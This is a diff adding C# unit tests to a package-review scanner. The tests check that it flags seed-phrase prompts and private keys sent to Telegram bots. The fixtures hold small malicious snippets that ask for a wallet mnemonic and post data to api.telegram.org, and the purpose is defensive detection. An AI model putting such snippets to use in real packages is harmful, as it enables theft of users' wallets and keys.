@@ -1901,6 +1901,29 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void A_seed_phrase_prompt_beside_browser_automation_or_a_chat_bot_is_noteworthy()
+    {
+        var prompt = Review(Tgz("walletbot-0.1.0.tar.gz",
+            ("walletbot-0.1.0/PKG-INFO", "Metadata-Version: 2.1\nName: walletbot\nVersion: 0.1.0\nSummary: Bot\n"),
+            ("walletbot-0.1.0/pkg/m.py", "from selenium import webdriver\ndriver = webdriver.Chrome()\nseed = input(\"Enter your wallet's seed phrase: \")\n")));
+        Assert.Contains(prompt.Findings, f => f is { Rule: "package/secret-prompt", Level: "noteworthy", Path: "walletbot-0.1.0/pkg/m.py" });
+        Assert.Contains(Details("const m = prompt('Paste your mnemonic');\nfetch(`https://api.telegram.org/bot${t}/sendMessage`, { body: m });"), d => d.StartsWith("asks for a seed phrase", StringComparison.Ordinal));
+        Assert.DoesNotContain(Details("const n = input('Enter seed phrase: ');"), d => d.StartsWith("asks for a seed phrase", StringComparison.Ordinal));
+        Assert.DoesNotContain(Details("const s = require('net');\nconst seed = input('Random seed: ');"), d => d.StartsWith("asks for a seed phrase", StringComparison.Ordinal));
+        Assert.DoesNotContain(Details("const axios = require('axios');\nconst k = rl.question('Enter private key: ');\naxios.post(rpc, {})"), d => d.StartsWith("asks for a seed phrase", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void Camel_case_private_keys_sent_to_a_chat_bot_are_noteworthy()
+    {
+        var hook = Review(Tgz("keys-1.0.0.tgz",
+            ("package/package.json", """{"name":"keys","version":"1.0.0","main":"index.js"}"""),
+            ("package/index.js", "const axios = require('axios');\nasync function sendPrivateKeys(t, text) { await axios.post(`https://api.telegram.org/bot${t}/sendMessage`, { text }); }\n")));
+        Assert.Contains(hook.Findings, f => f is { Rule: "package/webhook-secrets", Level: "noteworthy" });
+        Assert.Contains(Details("const getBTCPrivateKey = () => k;\nfetch(`https://api.telegram.org/bot${t}/sendMessage`);"), d => d.StartsWith("sends passwords, keys", StringComparison.Ordinal));
+    }
+
+    [Fact]
     public void A_vscode_extension_that_lists_accounts_and_privileges_is_noteworthy()
     {
         var pkg = """{"name":"discover","publisher":"acme","version":"0.0.1","main":"./extension.js"}""";
